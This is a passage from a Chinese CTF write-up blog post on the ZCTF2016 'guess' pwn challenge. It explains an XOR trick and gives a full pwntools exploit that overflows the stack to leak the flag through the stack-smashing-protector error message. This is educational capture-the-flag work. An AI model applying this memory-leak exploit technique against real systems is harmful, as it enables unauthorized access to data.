+<p>3、<code>异或</code>在异或双方不同情况下是<code>可逆的</code>，所以我们需要选取一个<code>不在</code>正确flag中的字母，与<code>正确flag</code>的每一个字符进行<code>异或</code>。泄露出<code>异或后的结果字符串</code>后，再用<code>相同的字母</code>进行一次<code>异或</code>，就可以得到<code>正确的flag</code>。如果选取<code>正确flag中的字符</code>，异或后结果为<code>“\x00”</code>，泄漏时会造成<code>“\x00”截断</code>。我们需要不断尝试，找到一个<code>合适的异或数</code>。这里选用<code>“b”</code>。</p>
+</blockquote>
+<p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 测试Flag: ZCTF&#123;welcome_to_zctf,i_love_you&#125;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./guess'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x40096D,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400A2F,ftell()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400A61,fgets()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400A83,gets()函数调用地址</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'220.249.52.133'</span>,<span class="number">34604</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            io = gdb.debug(<span class="string">'./guess'</span>,<span class="string">'''</span></span><br><span class="line"><span class="string">                                        bp 0x40096D</span></span><br><span class="line"><span class="string">                                        bp 0x400A2F</span></span><br><span class="line"><span class="string">                                        bp 0x400A61</span></span><br><span class="line"><span class="string">                                        bp 0x400A83'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./guess'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(io,result)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        flag += chr(ord(i)^ord(<span class="string">'b'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Flag: ZCTF&#123;%s"</span>%flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_len</span><span class="params">(io,length)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"please guess the flag:\n"</span>)</span><br><span class="line">    flag_addr = <span class="number">0x6010C0</span></span><br><span class="line">    payload = <span class="string">'A'</span>*length + <span class="string">"\x00"</span></span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"len error"</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,length)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"please guess the flag:\n"</span>)</span><br><span class="line">    flag_addr = <span class="number">0x6010C0</span> + <span class="number">5</span></span><br><span class="line">    payload = <span class="string">"ZCTF&#123;"</span></span><br><span class="line">    payload = payload.ljust(length,<span class="string">'b'</span>)</span><br><span class="line">    payload += <span class="string">"\x00"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x7fffffffddb8</span> - <span class="number">0x7fffffffdc90</span>,<span class="string">'A'</span>)</span><br><span class="line">    payload += p64(flag_addr)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">    result = io.recvline()</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">print</span> str_to_hex(result[<span class="number">0</span>:<span class="number">27</span>]) + result[<span class="number">27</span>:<span class="number">-1</span>] + str_to_hex(result[<span class="number">-1</span>:])</span><br><span class="line">    result = result.split(<span class="string">' terminated\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> str_to_hex(result)</span><br><span class="line">    xor(io,result)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span> <span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    mark = <span class="number">0</span> <span class="comment"># mark = 1表示泄露flag长度</span></span><br><span class="line">    <span class="keyword">if</span> mark:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"*********************Start*********************"</span></span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"length:"</span>,i</span><br><span class="line">            <span class="keyword">if</span> leak_len(io,i) == <span class="keyword">True</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"**********************End**********************"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = <span class="number">32</span></span><br><span class="line">        io = get_io()</span><br><span class="line">        pwn(io,length)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
+        <p><span>发布时间:</span>2020-07-05, 00:00</p>
+        <p><span>最后更新:</span>2020-10-03, 15:43</p>
+        
+            <p>
+                <span>更新历史:</span><i class="fa fa-github"></i>
+                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-07-05.ZCTF2016——WriteUp(Pwn).md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
+                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-07-05.ZCTF2016——WriteUp(Pwn).md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
+                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2020-07-05.ZCTF2016——WriteUp(Pwn).md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
+            </p>
+        
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/" title="ZCTF2016——WriteUp(Pwn)">http://sp4n9x.github.io/2020/07/05/ZCTF2016——WriteUp(Pwn)/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2020/07/05/ZCTF2016——WriteUp(Pwn)/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+    
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">
+                    RCTF2015——WriteUp(Pwn)
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/05/08/ZIP文件格式分析/">
+                    ZIP文件格式分析
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+
+
+
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#guess-pwn100"><span class="toc-text">guess-pwn100</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-检查程序开启的保护机制"><span class="toc-text">0x00 检查程序开启的保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-静态分析"><span class="toc-text">0x10 静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-编写exp"><span class="toc-text">0x20 编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x21-Stack-Smashing-Protector"><span class="toc-text">0x21 Stack Smashing Protector</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x22-开启了Stack-Smashing-Protector的程序特征"><span class="toc-text">0x22 开启了Stack Smashing Protector的程序特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x23-利用Stack-Smashing-Protector泄露信息"><span class="toc-text">0x23 利用Stack Smashing Protector泄露信息</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
+    </script>
+
+
+
+    
+    <div class="share">
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"ZCTF2016——WriteUp(Pwn)　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    </div>
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function () {
+            this.page.url = 'http://sp4n9x.github.io/2020/07/05/ZCTF2016——WriteUp(Pwn)/';
+            this.page.identifier = '2020/07/05/ZCTF2016——WriteUp(Pwn)/';
+        };
+        var loadComment = function() {
+            var d = document, s = d.createElement('script');
+            s.src = '//Sp4n9x.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
+<span class="disqus-comment-count" data-disqus-identifier="2020/07/05/ZCTF2016——WriteUp(Pwn)/"></span>
+<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2020/07/05/ZCTF2016——WriteUp(Pwn)/"></span>
+<script>
+    $(".disqus-comment-count").hide();
+    var $disqusCount = $(".disqus-comment-count");
+    $disqusCount.bind("DOMNodeInserted", function(e) {
+        $(".count-comment").text(
+            $(this).text().replace(/[^0-9]/ig,"")
+        )
+        DISQUSWIDGETS.getCount({reset: true});
+    })
+</script>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/07/19/RCTF2015——WriteUp(Pwn)/" title="上一篇: RCTF2015——WriteUp(Pwn)">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/05/08/ZIP文件格式分析/" title="下一篇: ZIP文件格式分析">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/06/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2020 Sp4n9x
+            </div>
+            <div class="footer-right">
+                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 10;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+             post: ".article-entry a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    <!-- 点击爱心效果 -->
+    <script src="/js/love.js"></script>
+  </div>
+</body>
+</html>
